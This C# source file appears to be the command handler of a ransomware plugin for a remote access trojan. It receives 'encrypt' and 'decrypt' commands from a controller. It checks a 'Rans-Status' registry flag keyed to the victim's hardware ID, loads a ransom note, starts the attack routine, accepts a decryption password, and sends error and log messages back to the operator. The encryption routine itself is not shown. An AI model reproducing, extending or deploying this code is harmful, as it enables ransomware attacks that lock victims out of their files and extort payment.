using Plugin.Handler;
using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Microsoft.VisualBasic.CompilerServices;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "encrypt":
                        {
                            var readValue = Registry.GetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid, "Rans-Status", null);
                            if (Conversions.ToBoolean(Operators.ConditionalCompareObjectEqual(readValue, "Encrypted", false)))
                            {
                                Error(Connection.Hwid + "Already Encrypted!");
                                return;
                            }
                            else 
                            {
                                var enc = new HandleEncrypt();
                                enc.Mynote = unpack_msgpack.ForcePathObject("Message").AsString;
                                Thread.Sleep(1000);
                                enc.BeforeAttack();
                            }
                            break;
                        }

                    case "decrypt":
                        {
                            var readValue = Registry.GetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid, "Rans-Status", null);
                            if (Conversions.ToBoolean(Operators.ConditionalCompareObjectEqual(readValue, "Decrypted", false)))
                            {
                                Error(Connection.Hwid + "Already decrypted!");
                                return;
                            }
                            else
                            {
                                var enc = new HandleDecrypt();
                                enc.Pass = unpack_msgpack.ForcePathObject("Password").AsString;
                                Thread.Sleep(1000);
                                enc.BeforeDec();
                            }
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }

        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}